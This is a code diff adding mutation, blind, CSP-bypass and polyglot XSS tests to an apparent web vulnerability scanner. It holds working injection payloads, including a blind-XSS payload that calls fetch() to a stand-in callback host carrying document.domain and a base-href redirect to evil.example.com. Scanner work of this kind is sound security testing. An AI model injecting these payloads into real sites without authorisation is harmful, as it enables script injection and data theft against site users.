@@ -44,7 +44,115 @@ class XSSModule:
         
         # Test DOM XSS indicators
         self._test_dom(url, method, param, value)
+        
+        # Test mutation XSS
+        self._test_mxss(url, method, param, value)
+        
+        # Test blind XSS
+        self._test_blind_xss(url, method, param, value)
+        
+        # Test CSP bypass
+        self._test_csp_bypass(url, method, param, value)
+        
+        # Test polyglot payloads
+        self._test_polyglot(url, method, param, value)
     
+    def _test_mxss(self, url: str, method: str, param: str, value: str):
+        """Test for mutation XSS (mXSS)"""
+        payloads = [
+            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
+            '<svg><animate onbegin=alert(1) attributeName=x>',
+            '<details open ontoggle=alert(1)>',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if payload in response.text or 'onerror' in response.text.lower():
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="XSS (Mutation XSS / mXSS)", url=url,
+                        severity='HIGH', confidence=0.85, param=param,
+                        payload=payload, evidence="mXSS payload reflected in response",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_blind_xss(self, url: str, method: str, param: str, value: str):
+        """Test for blind XSS via callback"""
+        cb = self.engine.config.get('callback_domain', 'xss.callback.example.com')
+        payloads = [
+            f'"><script src=https://{cb}/x></script>',
+            f"'><img src=x onerror=fetch('https://{cb}/'+document.domain)>",
+        ]
+        for payload in payloads:
+            try:
+                self.requester.request(url, method, data={param: payload})
+                from core.engine import Finding
+                finding = Finding(
+                    technique="XSS (Blind XSS Callback)", url=url,
+                    severity='INFO', confidence=0.3, param=param,
+                    payload=payload,
+                    evidence=f"Blind XSS payload injected — verify callback at {cb}",
+                )
+                self.engine.add_finding(finding)
+                return
+            except Exception:
+                continue
+
+    def _test_csp_bypass(self, url: str, method: str, param: str, value: str):
+        """Test for CSP bypass XSS"""
+        payloads = [
+            '<base href="https://evil.example.com/">',
+            '{{constructor.constructor("alert(1)")()}}',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if payload in response.text:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="XSS (CSP Bypass)", url=url,
+                        severity='HIGH', confidence=0.7, param=param,
+                        payload=payload, evidence="CSP bypass payload reflected",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
+    def _test_polyglot(self, url: str, method: str, param: str, value: str):
+        """Test for XSS with polyglot payloads"""
+        payloads = [
+            "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert() )//",
+            "'-alert()-'",
+            '</script><svg onload=alert()>',
+        ]
+        for payload in payloads:
+            try:
+                data = {param: payload}
+                response = self.requester.request(url, method, data=data)
+                if not response:
+                    continue
+                if payload in response.text:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="XSS (Polyglot)", url=url,
+                        severity='HIGH', confidence=0.8, param=param,
+                        payload=payload, evidence="Polyglot XSS payload reflected",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
+
     def test_url(self, url: str):
         """Test URL for XSS"""
         pass
